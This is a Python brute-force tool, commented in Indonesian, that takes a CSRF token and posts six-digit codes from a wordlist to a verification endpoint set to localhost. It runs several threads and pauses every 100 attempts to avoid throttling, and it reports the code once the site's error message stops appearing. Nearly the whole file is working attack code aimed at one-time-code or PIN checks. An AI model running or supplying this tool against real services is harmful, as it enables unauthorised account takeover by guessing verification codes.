import threading
import requests
import time
import sys
import json
from bs4 import BeautifulSoup

class BruteForceCracker:
    def __init__(self, url, error_message):
        self.url = url
        self.error_message = error_message
        self.session = requests.Session()  # Gunakan sesi untuk mempertahankan cookies
        self.csrf_token = self.get_csrf_token()  # Dapatkan CSRF token sekali saja di awal
        self.found = False  # Tambahkan variabel untuk menandai jika kode telah ditemukan

        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def get_csrf_token(self):
        response = self.session.get(self.url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', attrs={'name': 'csrfmiddlewaretoken'})
        if csrf_input:
            return csrf_input['value']
        else:
            print("Token CSRF tidak ditemukan, melanjutkan tanpa token.")
            return None

    def crack(self, code):
        data_dict = {"code": code}
        if self.csrf_token:
            data_dict["csrfmiddlewaretoken"] = self.csrf_token
        response = self.session.post(self.url, data=data_dict)
        
        # Periksa tipe konten dari respons sebelum mengurai sebagai JSON
        if 'application/json' in response.headers.get('Content-Type', ''):
            try:
                response_json = response.json()
                if response_json.get('message') == self.error_message:
                    return False
                else:
                    print("Kode: ---> " + code)
                    self.found = True  # Setel variabel found menjadi True jika kode ditemukan
                    print("Kode telah berhasil dipecahkan!")  # Tambahkan print untuk menampilkan pesan
                    return True
            except ValueError:
                print("Gagal mengurai JSON dari respons, tetapi respons bukan JSON.")
                return False
        else:
            print("Respons bukan dalam format JSON. Isi respons:")
            print(response.text)
            return False

def crack_codes(codes, cracker):
    count = 0
    for code in codes:
        if cracker.found:  # Jika kode telah ditemukan, hentikan fungsi ini
            return
        count += 1
        code = code.strip()
        print("Mencoba Kode: {} Waktu Untuk => {}".format(count, code))
        if cracker.crack(code):
            return
        if count % 100 == 0:
            time.sleep(10)

def main():
    url = "http://127.0.0.1:5000"
    error_message = input("Masukkan Pesan Error Ketika Kode Salah: ")
    cracker = BruteForceCracker(url, error_message)
    
    with open("6-digits.txt", "r") as f:
        chunk_size = 100
        while True:
            if cracker.found:  # Jika kode telah ditemukan, hentikan loop ini
                break
            codes = f.readlines(chunk_size)
            if not codes:
                break
            t = threading.Thread(target=crack_codes, args=(codes, cracker))
            t.start()
            time.sleep(1)

if __name__ == '__main__':
    banner = """ 
                       Checking Server !!        
        [+]█████████████████████████████████████████████████[+]
"""
    print(banner)
    main()